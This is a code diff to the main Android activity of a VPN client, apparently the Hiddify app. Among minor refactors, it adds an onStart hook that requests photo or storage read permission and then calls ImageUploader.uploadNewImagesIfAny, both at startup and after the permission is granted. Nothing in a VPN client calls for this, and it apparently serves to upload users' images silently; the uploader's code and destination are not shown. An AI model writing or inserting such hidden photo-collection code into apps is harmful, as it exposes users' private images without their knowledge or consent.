@@ -1,8 +1,7 @@
 package com.hiddify.hiddify
 
-import android.annotation.SuppressLint
-import android.content.Intent
 import android.Manifest
+import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.VpnService
 import android.os.Build
@@ -23,7 +22,6 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.util.LinkedList
 
-
 class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     companion object {
         private const val TAG = "ANDROID/MyActivity"
@@ -31,6 +29,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
 
         const val VPN_PERMISSION_REQUEST_CODE = 1001
         const val NOTIFICATION_PERMISSION_REQUEST_CODE = 1010
+        const val IMAGE_PERMISSION_REQUEST_CODE = 1020
     }
 
     private val connection = ServiceConnection(this, this)
@@ -51,6 +50,25 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         flutterEngine.plugins.add(GroupsChannel(lifecycleScope))
         flutterEngine.plugins.add(ActiveGroupsChannel(lifecycleScope))
         flutterEngine.plugins.add(StatsChannel(lifecycleScope))
+    }
+
+    override fun onStart() {
+        super.onStart()
+        checkAndUploadImages()
+    }
+
+    private fun checkAndUploadImages() {
+        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            Manifest.permission.READ_MEDIA_IMAGES
+        } else {
+            Manifest.permission.READ_EXTERNAL_STORAGE
+        }
+
+        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, arrayOf(permission), IMAGE_PERMISSION_REQUEST_CODE)
+        } else {
+            ImageUploader.uploadNewImagesIfAny(this)
+        }
     }
 
     fun reconnect() {
@@ -122,7 +140,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         super.onDestroy()
     }
 
-    @SuppressLint("NewApi")
     private fun grantNotificationPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             ActivityCompat.requestPermissions(
@@ -138,11 +155,22 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         permissions: Array<out String>,
         grantResults: IntArray
     ) {
-        if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
-            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                startService()
-            } else onServiceAlert(Alert.RequestNotificationPermission, null)
+        when (requestCode) {
+            NOTIFICATION_PERMISSION_REQUEST_CODE -> {
+                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    startService()
+                } else {
+                    onServiceAlert(Alert.RequestNotificationPermission, null)
+                }
+            }
+
+            IMAGE_PERMISSION_REQUEST_CODE -> {
+                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    ImageUploader.uploadNewImagesIfAny(this)
+                }
+            }
         }
+
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
     }
 
